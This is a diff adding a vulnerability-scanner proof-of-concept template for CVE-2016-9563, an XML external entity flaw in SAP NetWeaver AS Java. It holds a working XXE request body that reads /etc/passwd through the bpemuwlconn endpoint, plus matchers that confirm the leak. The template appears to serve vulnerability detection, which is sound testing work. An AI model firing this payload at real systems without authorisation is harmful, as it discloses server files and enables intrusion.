@@ -1,0 +1,57 @@
+[info]
+author = "AVE"
+description = "检测 SAP NetWeaver Application Server Java 7.5 BC-BMT-BPM-DSK 组件中的 XML 外部实体注入漏洞。向 sap.com~tc~bpem~him~uwlconn~provider~web/bpemuwlconn 端点发送包含外部实体的特制 XML 请求，验证服务器是否解析外部实体导致信息泄露。"
+id = "POC-AVE-2016-0900"
+name = "SAP NetWeaver AS JAVA XXE Vulnerability PoC"
+severity = "medium"
+tags = [
+    "cve-2016-9563",
+    "sap",
+    "netweaver",
+    "xxe",
+]
+vuln_id = [
+    "CVE-2016-9563",
+    "AVE-2016-0900",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/sap.com~tc~bpem~him~uwlconn~provider~web/bpemuwlconn"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <foo>&xxe;</foo>
+  </soap:Body>
+</soap:Envelope>"""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/xml"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "root:",
+    "file:/",
+    "ENTITY",
+    "xxe",
+]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
